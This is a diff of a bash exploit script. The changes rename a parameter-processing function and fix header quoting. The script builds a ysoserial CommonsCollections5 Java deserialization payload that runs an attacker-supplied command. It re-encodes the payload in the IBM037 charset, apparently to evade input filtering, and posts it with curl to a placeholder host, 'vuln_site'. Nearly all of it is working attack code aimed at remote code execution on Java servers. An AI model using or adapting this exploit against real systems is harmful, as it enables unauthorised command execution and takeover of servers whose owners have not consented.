@@ -30,19 +30,19 @@ function run_processors {
     echo "$data"
 }
 
-function preproc {
-    local data param param_name param_name_enc param_val param_val_enc
+function param_processor {
+    local data param param_name param_name_proc param_val param_val_proc
     
     data=""
     while IFS= read -r -d '&' param || [[ ! -z $param ]];do
         param_name=${param%%=*}
-        param_name_dec=$(echo "$param_name"|run_processors "${1}")
+        param_name_proc=$(echo "$param_name"|run_processors "${1}")
         [[ $param_name == "${param}" ]] && {
-            data=$(printf '%s&%s' "${data}" "$param_name_dec")
+            data=$(printf '%s&%s' "${data}" "$param_name_proc")
         } || {
             param_val=${param#"${param_name}="}
-            param_val_dec=$(echo "$param_val"|run_processors "${1}")
-            data=$(printf '%s&%s=%s' "${data}" "$param_name_dec" "$param_val_dec")
+            param_val_proc=$(echo "$param_val"|run_processors "${1}")
+            data=$(printf '%s&%s=%s' "${data}" "$param_name_proc" "$param_val_proc")
         }
     done
     echo "${data:1}"
@@ -52,6 +52,6 @@ charset=ibm037
 processors=(urldecode "enc '${charset^^}'" urlencode)
 static_data='param1=v%61l%201&state='
 payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
-data=$(printf "%s" "${static_data}${payload}"|preproc processors)
+data=$(printf "%s" "${static_data}${payload}"|param_processor processors)
 
-curl -i -s -k -H 'Content-Type: application/x-www-form-urlencoded; charset=${charset,,}' -d "$data" 'https://vuln_site'
+curl -i -s -k -H "Content-Type: application/x-www-form-urlencoded; charset=${charset,,}" -d "$data" 'https://vuln_site'
